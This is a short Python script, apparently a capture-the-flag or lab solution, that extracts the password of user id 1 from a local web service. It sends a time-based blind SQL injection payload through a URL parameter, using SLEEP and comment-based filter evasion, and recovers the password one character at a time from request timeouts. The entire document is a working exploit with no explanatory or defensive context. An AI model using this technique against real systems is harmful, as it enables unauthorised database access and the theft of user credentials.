#!python3
import requests
import string
sess=requests.Session()
url="http://localhost:10666/index.php"
i=1
passwd=''
while True:
    for c in string.printable:
        data={
            'url':f"http://localhost/api/checkUser.php?id=1/**/AND/**/IF(SUBSTRING((SELECT/**/passwoRd/**/FROM/**/users/**/WHERE/**/id=1),{i},1)='{c}',SLEEP(3),1)",
            'submit':'Submit'
        }     
        try:
            r=sess.post(url,data=data,timeout=3)
        except:
            i+=1
            passwd+=c
            print(passwd)
            break